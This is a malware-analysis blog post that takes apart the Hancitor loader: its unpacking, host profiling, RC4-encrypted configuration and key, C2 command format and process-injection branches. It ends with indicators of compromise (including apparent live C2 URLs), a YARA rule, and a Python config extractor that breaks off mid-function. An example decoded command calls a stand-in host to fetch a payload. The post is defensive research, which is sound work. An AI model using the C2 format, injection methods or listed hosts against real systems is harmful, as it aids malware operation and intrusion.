<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hancitor Loader - Cyber-Anubis</title>
<meta name="description" content="Dissecting Hancitor the famous malware loader. Hancitor is currently in the wild sneaking into organizations using phishing campaign … ">


  <meta name="author" content="Nidal Fikri">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Cyber-Anubis">
<meta property="og:title" content="Hancitor Loader">
<meta property="og:url" content="https://cyber-anubis.github.io/malware%20analysis/hancitor/">


  <meta property="og:description" content="Dissecting Hancitor the famous malware loader. Hancitor is currently in the wild sneaking into organizations using phishing campaign … ">



  <meta property="og:image" content="https://cyber-anubis.github.io/assets/images/malware-analysis/Hancitor/thumbnail.png">





  <meta property="article:published_time" content="2021-09-09T00:00:00+00:00">





  

  


<link rel="canonical" href="https://cyber-anubis.github.io/malware%20analysis/hancitor/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Nidal Fikri",
      "url": "https://cyber-anubis.github.io/"
    
  }
</script>


  <meta name="google-site-verification" content="J3MnMF94zaZhTUoNtUiRt9cKsr7hiMyTxEdAvQ3GfmY" />





<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Cyber-Anubis Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/site_data/logo.png" alt=""></a>
        
        <a class="site-title" href="/">
          Cyber-Anubis
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/#malware-analysis">Malware Analysis</a>
            </li><li class="masthead__menu-item">
              <a href="">Tutorials</a>
            </li><li class="masthead__menu-item">
              <a href="/categories">All Categories</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/site_data/avatar.jpg" alt="Nidal Fikri" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Nidal Fikri</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Hatching Triage Malware Research Analyst. Ex-Trend Micro Intern.</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Egypt</span>
        </li>
      

      
        
          
            <li><a href="https://cyber-anubis.github.io/aboutme/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">About Me</span></a></li>
          
        
          
            <li><a href="mailto:nidalfikrikamil@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
            <li><a href="https://twitter.com/cyber_anubis" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
        
          
            <li><a href="https://www.linkedin.com/in/nidal-fikri-kamil/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://github.com/cyber-anubis" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hancitor Loader">
    <meta itemprop="description" content="Hancitor in a Nutshell">
    <meta itemprop="datePublished" content="2021-09-09T00:00:00+00:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Hancitor Loader
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  13 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#hancitor-in-a-nutshell">Hancitor in a Nutshell</a></li>
  <li><a href="#hancitor-infection-vector">Hancitor Infection Vector</a></li>
  <li><a href="#technical-summary">Technical Summary</a></li>
  <li><a href="#technical-analysis">Technical Analysis</a>
    <ul>
      <li><a href="#first-look--unpacking">First look &amp; Unpacking</a></li>
      <li><a href="#host-profiling">Host Profiling</a></li>
      <li><a href="#configuration-extraction">Configuration Extraction</a></li>
      <li><a href="#cc-communication">C&amp;C Communication</a></li>
      <li><a href="#executing-c2-commands">Executing C2 Commands</a></li>
    </ul>
  </li>
  <li><a href="#conclusion">Conclusion</a></li>
  <li><a href="#iocs">IoCs</a></li>
  <li><a href="#yara-rule">YARA Rule</a></li>
  <li><a href="#python-automated-configuration-extraction">Python Automated Configuration Extraction</a></li>
  <li><a href="#refrences">Refrences</a></li>
</ul>

            </nav>
          </aside>
        
        <h1 id="hancitor-in-a-nutshell">Hancitor in a Nutshell</h1>

<p>Hancitor is a famous malware loader that has been in use for years since first being observed in 2015. A malware <strong><em>loader</em></strong> is the software which drops the actual malicious content on the system then executes the first stage of the attack. Hancitor has been the attacker’s loader of choice to deliver malwares like: <strong>FickerStealer, Sendsafe, and Cobalt Strike</strong> if the victim characteristics are met. In recent months, more threat intelligence has been gathered to confirm the selection of Hancitor by <strong>Cuba Ransomware</strong> gangs as well <a href="https://blog.group-ib.com/hancitor-cuba-ransomware">[1]</a>. The popularity of Hancitor among threat actors is considered to last for a while. Therefore, it’s crucial to assure your organization’s safety from this emerging threat.</p>

<h1 id="hancitor-infection-vector">Hancitor Infection Vector</h1>

<p><a href="/assets/images/malware-analysis/Hancitor/entry.png"><img src="/assets/images/malware-analysis/Hancitor/entry.png" alt="" /></a></p>
<center><font size="3"><u>Figure</u>(1): <u>How Hancitor can sneak into your environment to download additional malwares.</u></font> </center>
<p><br />
Hancitor DLL is embedded within malicious documents delivered by phishing e-mails . The method that the malicious document uses to achieve execution is usually a VBA macro that is executed when the document is opened. Being dropped by the doc file, the initial packed DLL is an intermediate stage responsible for unpacking and exposing the true functionality of Hancitor. Based on the collected information about the victim host, it will decide which malware to deploy. Hancitor will then proceed to perform the loading functionality in order to infect the system with the actual malicious content.</p>

<h1 id="technical-summary">Technical Summary</h1>

<ol>
  <li><strong>Configuration Extraction:</strong> Hancitor comes with embedded <u>RC4</u> encrypted configuration with hard-coded key. It uses the Microsoft Windows <code class="language-plaintext highlighter-rouge">CryptoAPI</code> to do the decryption. These configuration contains the C2 which it will communicate with for further commands.</li>
  <li><strong>Host Profiling:</strong> Hancitor will gather information about the host in order to decide which malicious payload will be downloaded as well as to generate a unique victim ID. For instance, if the host is connected to an active directory domain, <u>Cobalt Strike</u> conditions are met. Collected information contains: OS version, IP address, Domains trusts, Computer name &amp; username.</li>
  <li><strong>C2 Communication:</strong> The victim profile will be forwarded to the C2 to decide further orders. The returned C2 command is base64 encoded with additional layer of single-byte XOR encryption. The command defines a set of 5 available loading techniques to be performed + a new URL to download the additional malware to be loaded and executed.</li>
  <li><strong>Payload Download:</strong> There are a lot of options to be selected. For example, Hancitor can download fully grown malicious EXE or DLL files, or even tightly crafted <u>shellcodes</u>. There is high degree of flexibility here that can serve a lot of threat actors which makes Hancitor a great choice.</li>
  <li><strong>Malicious Code Execution:</strong> Whether it’s <u>process injection</u> or simply to drop on disk and execute the malware, Hancitor is capable of performing the complex operation to ensure running that the malicious code on the victim’s machine.</li>
</ol>

<h1 id="technical-analysis">Technical Analysis</h1>

<h2 id="first-look--unpacking">First look &amp; Unpacking</h2>

<p><a href="/assets/images/malware-analysis/Hancitor/virus_total.png"><img src="/assets/images/malware-analysis/Hancitor/virus_total.png" alt="" /></a></p>
<center><font size="3"> <u>Figure</u>(2): <u>Results are at 2021-08-26 14:38:31 UTC. Different results may appear. </u> </font></center>
<p><br />
Catching the initial dropped DLL by the malicious document and inspecting it, it is first seen at <strong>2021-08-26 14:38:31 UTC</strong> according to <a href="https://www.virustotal.com/gui/file/efbdd00df327459c9db2ffc79b2408f7f3c60e8ba5f8c5ffd0debaff986863a8/detection/f-efbdd00df327459c9db2ffc79b2408f7f3c60e8ba5f8c5ffd0debaff986863a8-1629989820">VirusTotal</a>.
At the given date, the file sample was flagged as malicious by only 6 security vendors.</p>

<p><a href="/assets/images/malware-analysis/Hancitor/unpacking.png"><img src="/assets/images/malware-analysis/Hancitor/unpacking.png" alt="" /></a></p>
<center> <font size="3"><u>Figure</u> (3): <u>Before &amp; After view of the memory dump.</u> </font></center>
<p><br />
To unpack the dropped DLL, we use <strong>X64dbg</strong> to set a breakpoint on <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> API. After writing new data into the allocated memory space, we set a hardware breakpoint on execution there. We continue single stepping into the rest of the unpacking stub to assure the building of the import table. Then, we can spot a successfully unpacked PE header as well as many resolved strings in the newly allocated memory space. Finally, we dump the memory section into disk.</p>

<h2 id="host-profiling">Host Profiling</h2>

<p><a href="/assets/images/malware-analysis/Hancitor/host_profiling.png"><img src="/assets/images/malware-analysis/Hancitor/host_profiling.png" alt="" /></a></p>
<center> <font size="3"><u>Figure</u> (4): <u>All functions were labeled after RE</u>. </font></center>
<p><br />
Using <strong>IDA Pro</strong> we can see that unpacked Hancitor DLL has two exports which lead to the same function. From there our static code analysis will begin.  The malware functionality begins with host profiling. Collected information contains: OS version, Victim’s IP address, Domains names &amp; DNS names, Computer name, username, and whether the machine is x64 or x86.</p>

<p><a href="/assets/images/malware-analysis/Hancitor/unique_ID.png"><img src="/assets/images/malware-analysis/Hancitor/unique_ID.png" alt="" /></a></p>
<center><font size="3"> <u>Figure</u>(5): <u>The malware uses</u> GetAdaptersAddresses <u>to obtain the required info.</u></font> </center>
<p><br />
It creates a unique ID for the victim using its MAC addresses of all the connected adapters XORed with the Windows directory volume serial number.</p>

<p><a href="/assets/images/malware-analysis/Hancitor/concatinating_profile.png"><img src="/assets/images/malware-analysis/Hancitor/concatinating_profile.png" alt="" /></a></p>
<center><font size="3"> <u>Figure(</u>6): check_if_x64 <u>routine is used to determine if the victim machine is x64 or not.</u> </font></center>
<p><br />
Then, it concatenates the final string which will hold the collected host information to be sent to the C&amp;C server. The call to <code class="language-plaintext highlighter-rouge">mw_wrap_config_decryption</code> routine will be discussed in details in a few lines. It’s used to extract the embedded configuration which will also be used in the final host profile. Something that can be very useful while  <strong>YARA rules</strong> is the format string <code class="language-plaintext highlighter-rouge">{"GUID=%I64u&amp;BUILD=%s&amp;INFO=%s&amp;EXT=%s&amp;IP=%s&amp;TYPE=1&amp;WIN=%d.%d"}</code> which makes a good <em>indicator</em> for Hancitor . These collected characteristics about the infected host will decide which malware will be deployed. For instance, if the host is connected to an active directory domain, <strong>Cobalt Strike</strong> malware will be downloaded and executed.</p>

<h2 id="configuration-extraction">Configuration Extraction</h2>

<p><a href="/assets/images/malware-analysis/Hancitor/enc_config_dump.png"><img src="/assets/images/malware-analysis/Hancitor/enc_config_dump.png" alt="" /></a></p>
<center> <font size="3"><u>Figure</u>(7): <u>Hexadecimal representation of the data residing at the .data section.</u> </font></center>
<p><br />
But before finishing the host profile, the malware decrypts the embedded configuration in order to send a copy to the C&amp;C server. The decryption routine references two global data variables very close the beginning of the .<em>data section</em>. From the way the parameters are arranged for the decryption routine, I’ve concluded that the 8 bytes beginning at <code class="language-plaintext highlighter-rouge">0x5A5010</code> are the decryption key followed by the encrypted configuration.</p>

<p><a href="/assets/images/malware-analysis/Hancitor/config_decryption.png"><img src="/assets/images/malware-analysis/Hancitor/config_decryption.png" alt="" /></a></p>
<center><font size="3"> <u>Figure</u>(8): <u>You can use the MSDN documentation for more information about the APIs.</u></font> </center>
<p><br />
Hancitor comes with embedded <strong>RC4</strong> encrypted configuration with hard-coded key. It uses the Microsoft Windows <code class="language-plaintext highlighter-rouge">CryptoAPI</code>to do the decryption. First, the key will be <strong>SHA-1</strong> hashed before attempting the decryption. Then only the <strong>first 5 bytes</strong> of the hashed key will be used to decrypt the encrypted data.</p>

<p>The upper 16 bits of the 4th parameter denotes the size of the RC4 decryption key. Here it’s <code class="language-plaintext highlighter-rouge">0x280011 = 0000000000101000 -- 0000000000010001</code> 
in which <code class="language-plaintext highlighter-rouge">101000 = 40 bits or 5 bytes</code>.</p>

<p><a href="/assets/images/malware-analysis/Hancitor/cyberchef_data.png"><img src="/assets/images/malware-analysis/Hancitor/cyberchef_data.png" alt="" /></a></p>
<center><font size="3"> <u>Figure</u>(9): <u>Screen-shot from the actual decrypted configuration the malware uses.</u></font> </center>
<p><br />
We can use <a href="https://gchq.github.io/CyberChef/">CyberChef</a> to simulate the decryption process statically. First, the 8 bytes key <code class="language-plaintext highlighter-rouge">{f0da08fe225d0a8f}</code> will be <code class="language-plaintext highlighter-rouge">SHA-1 hashed = {67f6c6259f8f4ef06797bbd25edc128fd64e6ad7}</code>. Then, the first 5 bytes of the key will be used as the final RC4 decryption key for decrypting the configuration data. These configuration contains the C2 which it will communicate with for further commands based on the collected host profile. Here at the bottom right corner, we can see that the malware comes with 3 C&amp;C servers to try to connect with. At the end of this report, we will use another way to automatically extract the embedded configuration using Python.</p>

<h2 id="cc-communication">C&amp;C Communication</h2>

<p><a href="/assets/images/malware-analysis/Hancitor/c2_communication.png"><img src="/assets/images/malware-analysis/Hancitor/c2_communication.png" alt="" /></a></p>
<center> <font size="3"><u>Figure</u>(10): <u>The malware checks for 200 OK response before retrieving the C2 commands.</u></font> </center>
<p><br />
Hancitor extracts the C2 URLs and initializes the connection with the remote end using the high level <code class="language-plaintext highlighter-rouge">Wininet.dll</code> library APIs. It uses the following hard-coded User-Agent <code class="language-plaintext highlighter-rouge">{"Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko"}</code> which is very common.</p>

<p>First, the collected host profile is sent using HTTP POST request. Secondly, it accepts the matched C2 command based on the gathered information about the victim. The received C2 command is <strong>base64</strong> encoded and <strong>XOR</strong> encrypted with a single-byte key <code class="language-plaintext highlighter-rouge">0x7A</code>. The malware performs the necessary decoding before interpreting the command.</p>

<p>The command consists of 4 parts:</p>
<ol>
  <li>A character from the set <code class="language-plaintext highlighter-rouge">{'b','e','l','n','r'}</code> to specify what action to be performed.</li>
  <li>The colon character <code class="language-plaintext highlighter-rouge">:</code> as delimiter.</li>
  <li><strong>URL</strong> of the malicious content to be downloaded.</li>
  <li>The bar character <code class="language-plaintext highlighter-rouge">|</code> as delimiter.</li>
</ol>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># i.e decoded command</span>

 X:http://badsite.com/malware.exe|

</code></pre></div></div>

<h2 id="executing-c2-commands">Executing C2 Commands</h2>

<p><a href="/assets/images/malware-analysis/Hancitor/c2_commands.png"><img src="/assets/images/malware-analysis/Hancitor/c2_commands.png" alt="" /></a></p>
<center><font size="3"><u>Figure</u>(11): <u>Conditional code flows depending on the 1st character of the C2 command.</u> </font></center>
<p><br />
After retrieving the C2 command and performing the appropriate decoding, the command is validated and then passed to the routing in which it will download and execute the malicious content. The malicious content will be downloaded using the URL at offset 3 from the beginning of the C2 string. Then, based on the first character of the C2 command, one of the switch case branches will be executed.</p>

<p>There are 5 available options or executions paths. Excluding the <code class="language-plaintext highlighter-rouge">n</code> command because it simply acts as a <code class="language-plaintext highlighter-rouge">NOP</code> operation, so we have 4 valid options.</p>

<h3 id="the-b-command">The ‘b’ Command</h3>

<p>This execution branch will perform a process injection in a <strong>newly</strong> created <code class="language-plaintext highlighter-rouge">svchost.exe</code>process with <code class="language-plaintext highlighter-rouge">CREATE_SUSPENDED</code> flag. The injected malicious code is first checked to be a valid PE file -DLL or EXE- in order to be injected. For the new suspended <code class="language-plaintext highlighter-rouge">svchost.exe</code> process, the injection is done in a classic way using the APIs: <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> and <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code>. What is more interesting here is the way the malware sets the new Entry point for the malicious code.</p>

<p><a href="/assets/images/malware-analysis/Hancitor/change_OEP.png"><img src="/assets/images/malware-analysis/Hancitor/change_OEP.png" alt="" /></a></p>
<center> <font size="3"><u>Figure</u>(12): <u>A thread context is a snapshot of processor-specific register data.</u></font> </center>
<p><br />
It changes the value of the <code class="language-plaintext highlighter-rouge">EAX</code> register and sets the new thread context overwriting the old one. The <code class="language-plaintext highlighter-rouge">EAX</code> register in a newly created thread will always point to the <strong>OEP</strong>. This effectively transfers the entry point of the newly created <code class="language-plaintext highlighter-rouge">svchost.exe</code> process to the start of the injected malicious binary.</p>

<h3 id="the-e-command">The ‘e’ Command</h3>

<p><a href="/assets/images/malware-analysis/Hancitor/create_Thread_option.png"><img src="/assets/images/malware-analysis/Hancitor/create_Thread_option.png" alt="" /></a></p>
<center> <font size="3"><u>Figure</u>(13): lpStartAddress <u>parameter is a wrapper function which calls the OEP of the binary.</u> </font></center>
<p><br />
The difference between this execution branch and the previous one is that this performs execution of the malicious binary inside the currently running process without touching <code class="language-plaintext highlighter-rouge">svchost.exe</code>. First, Hancitor will perform PE header parsing to find the <code class="language-plaintext highlighter-rouge">ImageBase</code> and <code class="language-plaintext highlighter-rouge">AddressOfEntryPoint</code> fields.</p>

<p>Then, it will proceed to build the import table which will be used by the injected binary. It uses <code class="language-plaintext highlighter-rouge">LoadLibraryA</code>and <code class="language-plaintext highlighter-rouge">GetProcAddress</code> to do the job. That’s because the newly created thread will crash if it’s found to have dependencies problems. At last, based on function flags, the malware will decide to launch the newly downloaded malicious in a new separate thread or simply just to call it as a function.</p>

<h3 id="the-l-command">The ‘l’ Command</h3>

<p><a href="/assets/images/malware-analysis/Hancitor/inject_shellcode.png"><img src="/assets/images/malware-analysis/Hancitor/inject_shellcode.png" alt="" /></a></p>
<center><font size="3"><u>Figure</u>(14): <u>The functions flags are:</u> arg_inject_svchost <u>and</u> arg_create_new_thread <u>which decide the injection.</u> </font></center>
<p><br />
Here the malware doesn’t check for valid PE file because it’s supposed to inject a <strong>shellcode</strong>. Based on the function’s flags, Hancitor will decide which to inject a newly created <code class="language-plaintext highlighter-rouge">svchost.exe</code> or to call the malicious shellcode as a function in the currently running process.</p>

<p>The malware doesn’t need to resume the suspended process because its only suspends the main thread. The malware is creating another thread within <code class="language-plaintext highlighter-rouge">svchost.exe</code> to execute the malicious shellcode.</p>

<h3 id="the-r-command">The ‘r’ Command</h3>

<p><a href="/assets/images/malware-analysis/Hancitor/drop_binary.png"><img src="/assets/images/malware-analysis/Hancitor/drop_binary.png" alt="" /></a></p>
<center> <font size="3"><u>Figure</u>(15): %TEMP% <u>directory is used to store ephemeral temporary files.</u></font> </center>
<p><br />
This execution path is the only one that actually <strong>drops</strong> files on the disk. Hancitor will drop the newly downloaded malicious binary in the <code class="language-plaintext highlighter-rouge">%TEMP%</code> directory with a random name beginning with the “<strong>BN</strong>” prefix. Then, if it’s an EXE file, it will simply execute it in a new process. If it’s a DLL file, it will use <code class="language-plaintext highlighter-rouge">run32dll.exe</code>to execute the malicious DLL.</p>

<p><br /></p>
<h1 id="conclusion">Conclusion</h1>

<p>Hancitor is considered a straightforward loader but very efficient at the same time. So far, Hancitor has targeted companies of all sizes and in a wide variety of industries and countries to deploy very serious malwares like <strong>FickerStealer</strong>, <strong>Sendsafe</strong>, and <strong>Cobalt Strike</strong> or even <strong>Cuba Ransomware</strong>. It’s a must to take the appropriate countermeasures to defend your organization from such dreadful threat. We can’t be sure which threat actors will also use Hancitor as their loader in the future. Yet, one thing is sure: as effective as it has been to date, the threat posed by Hancitor will not fade away in the coming future.</p>

<p><br /></p>
<h1 id="iocs">IoCs</h1>

<table>
  <thead>
    <tr>
      <th style="text-align: left">No.</th>
      <th>Description</th>
      <th>Hash</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">1</td>
      <td>The initial dropped DLL</td>
      <td>EFBDD00DF327459C9DB2FFC79B2408F7F3C60E8BA5F8C5FFD0DEBAFF986863A8</td>
    </tr>
    <tr>
      <td style="text-align: left">2</td>
      <td>The unpacked DLL</td>
      <td>5E74015E439AE6AA7E0A29F26EF2389663EB769D25ABCEB636D8272A74F27B7F</td>
    </tr>
    <tr>
      <td style="text-align: left">4</td>
      <td>Hancitor C&amp;C Server 1</td>
      <td>http://intakinger.com/8/forum.php</td>
    </tr>
    <tr>
      <td style="text-align: left">5</td>
      <td>Hancitor C&amp;C Server 2</td>
      <td>http://idgentexpliet.ru/8/forum.php</td>
    </tr>
    <tr>
      <td style="text-align: left">6</td>
      <td>Hancitor C&amp;C Server 3</td>
      <td>http://declassivan.ru/8/forum.php</td>
    </tr>
  </tbody>
</table>

<p><br /></p>
<h1 id="yara-rule">YARA Rule</h1>

<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">rule</span> <span class="nt">hancitor</span> <span class="o">:</span> <span class="nt">loader</span>
<span class="p">{</span>
	<span class="py">meta</span><span class="p">:</span>
		<span class="n">description</span> <span class="err">=</span> <span class="s1">"This is a noob rule for detecting unpacked Hancitor DLL"</span>
		<span class="n">author</span> <span class="err">=</span> <span class="s1">"Nidal Fikri @cyber_anubis"</span>
		
	<span class="n">strings</span><span class="p">:</span>
		<span class="err">$</span><span class="n">mz</span> <span class="err">=</span> <span class="err">{</span><span class="m">4</span><span class="n">D</span> <span class="m">5</span><span class="n">A</span><span class="p">}</span> <span class="o">//</span><span class="nt">PE</span> <span class="nt">File</span>
	
		<span class="err">$</span><span class="nt">s1</span> <span class="o">=</span> <span class="s1">"http://api.ipify.org"</span> <span class="nt">ascii</span> <span class="nt">fullword</span>
		<span class="err">$</span><span class="nt">s2</span> <span class="o">=</span> <span class="o">/</span><span class="nt">GUID</span><span class="o">=%</span><span class="nt">I64u</span><span class="o">&amp;</span><span class="nt">BUILD</span><span class="o">=%</span><span class="nt">s</span><span class="o">&amp;</span><span class="nt">INFO</span><span class="o">=%</span><span class="nt">s</span><span class="o">(&amp;</span><span class="nt">EXT</span><span class="o">=%</span><span class="nt">s</span><span class="o">)?&amp;</span><span class="nt">IP</span><span class="o">=%</span><span class="nt">s</span><span class="o">&amp;</span><span class="nt">TYPE</span><span class="o">=</span><span class="err">1</span><span class="o">&amp;</span><span class="nt">WIN</span><span class="o">=%</span><span class="nt">d</span><span class="err">\</span><span class="o">.%</span><span class="nt">d</span><span class="err">\</span><span class="o">(</span><span class="nt">x64</span><span class="err">\</span><span class="o">)/</span> <span class="nt">ascii</span> <span class="nt">fullword</span>
		<span class="err">$</span><span class="nt">s3</span> <span class="o">=</span> <span class="o">/</span><span class="nt">GUID</span><span class="o">=%</span><span class="nt">I64u</span><span class="o">&amp;</span><span class="nt">BUILD</span><span class="o">=%</span><span class="nt">s</span><span class="o">&amp;</span><span class="nt">INFO</span><span class="o">=%</span><span class="nt">s</span><span class="o">(&amp;</span><span class="nt">EXT</span><span class="o">=%</span><span class="nt">s</span><span class="o">)?&amp;</span><span class="nt">IP</span><span class="o">=%</span><span class="nt">s</span><span class="o">&amp;</span><span class="nt">TYPE</span><span class="o">=</span><span class="err">1</span><span class="o">&amp;</span><span class="nt">WIN</span><span class="o">=%</span><span class="nt">d</span><span class="err">\</span><span class="o">.%</span><span class="nt">d</span><span class="err">\</span><span class="o">(</span><span class="nt">x32</span><span class="err">\</span><span class="o">)/</span> <span class="nt">ascii</span> <span class="nt">fullword</span>
		<span class="err">$</span><span class="nt">s4</span> <span class="o">=</span> <span class="s1">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko"</span> <span class="nt">ascii</span> <span class="nt">fullword</span>

	<span class="nt">condition</span><span class="o">:</span>
		<span class="o">(</span><span class="nt">filesize</span> <span class="o">&lt;</span> <span class="err">500</span><span class="nt">KB</span><span class="o">)</span> <span class="nt">and</span> <span class="o">(</span><span class="err">$</span><span class="nt">mz</span> <span class="nt">at</span> <span class="err">0</span><span class="o">)</span> <span class="nt">and</span> <span class="o">(</span><span class="err">3</span> <span class="nt">of</span> <span class="o">(</span><span class="err">$</span><span class="nt">s</span><span class="o">*))</span>
<span class="err">}</span>
</code></pre></div></div>

<p><br /></p>
<h1 id="python-automated-configuration-extraction">Python Automated Configuration Extraction</h1>

<p>This python script is used to automatically extract the configuration of the Hancitor malware. Steps required are as follows:</p>

<ul>
  <li>Open the binary file.</li>
  <li>Get the .data section.</li>
  <li>Extract the the key and the encrypted configuration data at offset 16.</li>
  <li>SHA-1 hash the extracted key to get the final key.</li>
  <li>Use the key to decrypt the configurations.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pefile</span>           <span class="c1">#To manipulate PE files
</span><span class="kn">import</span> <span class="nn">hashlib</span>          <span class="c1">#To perform the SHA-1 hashing
</span><span class="kn">import</span> <span class="nn">binascii</span>         <span class="c1">#To perfrom unhexing
</span><span class="kn">import</span> <span class="nn">arc4</span>             <span class="c1">#To perform the RC4 decryption
</span>
<span class="c1">#This functions creates a PE object. Then iterates over the sections to locate
#the .data section in order to return its content
</span><span class="k">def</span> <span class="nf">Get_Date_Section</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
    <span class="n">pe_file</span> <span class="o">=</span> <span class="n">pefile</span><span class="p">.</span><span class="n">PE</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">section</span> <span class="ow">in</span> <span class="n">pe_file</span><span class="p">.</span><span class="n">sections</span><span class="p">:</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s">".data"</span> <span class="ow">in</span> <span class="n">section</span><span class="p">.</span><span class="n">Name</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">section</span><span class="p">.</span><span class="n">get_data</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">rc4_decryption</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">encrypted_data</span><span class="p">):</span>
    <span class="n">cipher</span> <span class="o">=</span> <span class="n">arc4</span><span class="p">.</span><span class="n">ARC4</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="n">decrypted_content</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>
    <span class="n">extracted_config</span> <span class="o">=</span> <span class="n">decrypted_content</span><span class="p">[:</span><span class="mi">200</span><span class="p">]</span>
